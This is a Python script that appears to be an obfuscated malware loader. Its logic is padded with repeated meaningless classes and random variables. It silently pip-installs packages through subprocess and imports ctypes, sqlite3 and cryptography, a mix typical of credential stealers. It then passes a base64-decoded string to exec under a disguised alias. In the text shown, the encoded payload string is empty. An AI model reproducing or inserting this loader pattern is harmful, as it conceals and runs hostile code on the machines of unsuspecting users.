

from sys import executable, stderr
WYEbrzbS9p = 55976584
class mcUeIgb88Z:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'jf8oNHw', 'age': 55}
class DsdW0slxsJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'gkSxafL4fJ'
class J0pNee3NBv:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class RkIRcVJAFf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class bRnv2HLj0n:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class j2LGWpS3ht:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
SU7QstpFyg = 83254892
q3lZ38frl3 = 5407562
KeDBKk9dPM = 98057635
Td9VqAqlap = 73134019
class ktJ17WTNk0:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
fKFKpDtwOQ = 4308753
class UMc3aNtzvJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cLx4NfjS3d = 31407974
fo4VhXnU9N = 13202997
class wENNtRdfAO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Ngn9Fqbwhc = 96390913
fuzU420Rux = 55412430
class cM61pcAN38:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'DKZ0BHgEZo'", "'rFkVkFBmIE'", "'w9xwITifDB'", "'AaDN7UiDAA'"]
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
ModuleRequirements = [["cryptography", "cryptography"]]

for module in ModuleRequirements:
    try:        
        __import__(module[0])
    except:
        try:
            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
        except:
            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)

requirements = [
    ["requests", "requests"],
    ["cryptography", "cryptography"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
        time.sleep(3)
        
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)


import requests
from cryptography.fernet import Fernet
WYEbrzbS9p = 55976584
class mcUeIgb88Z:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'jf8oNHw', 'age': 55}
class DsdW0slxsJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'gkSxafL4fJ'
class J0pNee3NBv:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class RkIRcVJAFf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class bRnv2HLj0n:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class j2LGWpS3ht:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
SU7QstpFyg = 83254892
q3lZ38frl3 = 5407562
KeDBKk9dPM = 98057635
Td9VqAqlap = 73134019
class ktJ17WTNk0:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
fKFKpDtwOQ = 4308753
class UMc3aNtzvJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cLx4NfjS3d = 31407974
fo4VhXnU9N = 13202997
class wENNtRdfAO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Ngn9Fqbwhc = 96390913
fuzU420Rux = 55412430
class cM61pcAN38:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'DKZ0BHgEZo'", "'rFkVkFBmIE'", "'w9xwITifDB'", "'AaDN7UiDAA'"]
KLnQq5xGbSd5vsLYTPt5wqfPTzdXKaF6pea0OP = exec
WYEbrzbS9p = 55976584
class mcUeIgb88Z:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'jf8oNHw', 'age': 55}
class DsdW0slxsJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'gkSxafL4fJ'
class J0pNee3NBv:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class RkIRcVJAFf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class bRnv2HLj0n:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class j2LGWpS3ht:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
SU7QstpFyg = 83254892
q3lZ38frl3 = 5407562
KeDBKk9dPM = 98057635
Td9VqAqlap = 73134019
class ktJ17WTNk0:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
fKFKpDtwOQ = 4308753
class UMc3aNtzvJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cLx4NfjS3d = 31407974
fo4VhXnU9N = 13202997
class wENNtRdfAO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Ngn9Fqbwhc = 96390913
fuzU420Rux = 55412430
class cM61pcAN38:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'DKZ0BHgEZo'", "'rFkVkFBmIE'", "'w9xwITifDB'", "'AaDN7UiDAA'"]
import concurrent.futures
KUHmT0dsADcHG4wfFahgjrmLtJrhH3JBTfbSpJ=""
KLnQq5xGbSd5vsLYTPt5wqfPTzdXKaF6pea0OP(base64.b64decode(KUHmT0dsADcHG4wfFahgjrmLtJrhH3JBTfbSpJ))
WYEbrzbS9p = 55976584
class mcUeIgb88Z:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'jf8oNHw', 'age': 55}
class DsdW0slxsJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'gkSxafL4fJ'
class J0pNee3NBv:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class RkIRcVJAFf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class bRnv2HLj0n:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class j2LGWpS3ht:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
SU7QstpFyg = 83254892
q3lZ38frl3 = 5407562
KeDBKk9dPM = 98057635
Td9VqAqlap = 73134019
class ktJ17WTNk0:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
fKFKpDtwOQ = 4308753
class UMc3aNtzvJ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
cLx4NfjS3d = 31407974
fo4VhXnU9N = 13202997
class wENNtRdfAO:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
Ngn9Fqbwhc = 96390913
fuzU420Rux = 55412430
class cM61pcAN38:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
["'DKZ0BHgEZo'", "'rFkVkFBmIE'", "'w9xwITifDB'", "'AaDN7UiDAA'"]